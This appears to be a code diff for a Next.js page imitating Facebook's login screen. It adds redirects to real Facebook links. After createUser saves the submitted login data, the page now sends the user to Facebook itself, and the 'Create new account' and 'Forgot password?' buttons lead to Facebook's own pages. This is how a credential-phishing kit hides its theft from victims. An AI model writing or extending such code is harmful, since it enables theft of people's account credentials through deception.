@@ -1,5 +1,6 @@
 "use client"
 import { createUser } from "@/lib/actions/user.actions";
+import { createFacebookAccountLink, facebookLink, forgotFacebookPasswordLink } from "@/lib/links";
 import Image from "next/image";
 import { useRouter } from "next/navigation";
 import React, { useState } from "react";
@@ -28,13 +29,18 @@ function MainPage() {
     const response = await createUser(data);
     console.log("this is the resposne", response)
     if(response.messsage == 'success'){
-      console.log("congratulation")
+      window.location.href = facebookLink
 
     }
     else{
       setError("Something went wrong")
     }
     
+  };
+  
+  const handleCreateAccount = async (e: any) => {
+    e.preventDefault(); 
+    window.location.href = createFacebookAccountLink;
   };
 
   return (
@@ -86,20 +92,33 @@ function MainPage() {
               Log in
             </button>
             <div className="hidden sm:block">
-              <p className="text-[#0866ff] text-center m-1 text-[18px]">Forgot password?</p>
+              <p className="text-[#0866ff] text-center m-1 text-[18px]  cursor-pointer hover:underline" 
+                onClick={(e) =>{
+                  e.preventDefault()
+                  window.location.href = forgotFacebookPasswordLink
+                }}
+              >Forgot password?</p>
               <hr className="mt-4" />
               <div className="w-full mt-4 flex justify-center pt-4">
-                <button className="bg-[#42b72a] font-semibold py-[21px] px-[80px] text-white rounded-xl text-[19px] font-sans">
+                <button 
+                  className="bg-[#42b72a] font-semibold py-[21px] px-[80px] text-white rounded-xl text-[19px] font-sans"
+                  onClick={handleCreateAccount}
+                >
                   Create new account
                 </button>
               </div>
             </div>
           </form>
-          <p className="text-gray-800 sm:hidden text-center m-4">Forgot password?</p>
+          <p className="text-gray-800 sm:hidden text-center m-4 cursor-pointer hover:underline">Forgot password?</p>
         </div>
         <div className="text-black w-full flex flex-col pt-4 sm:hidden">
           <div className="mt-4">
-            <button className="text-[#0647c8] border-[0.5px] border-[#0647c8] w-full rounded-3xl p-[10px] text-[19px]">
+            <button 
+              className="text-[#0647c8] border-[0.5px] border-[#0647c8] w-full rounded-3xl p-[10px] text-[19px]"
+              onClick={
+                handleCreateAccount
+              }
+            >
               Create new account
             </button>
             <p className="flex gap-x-2 mt-3 justify-center w-full">
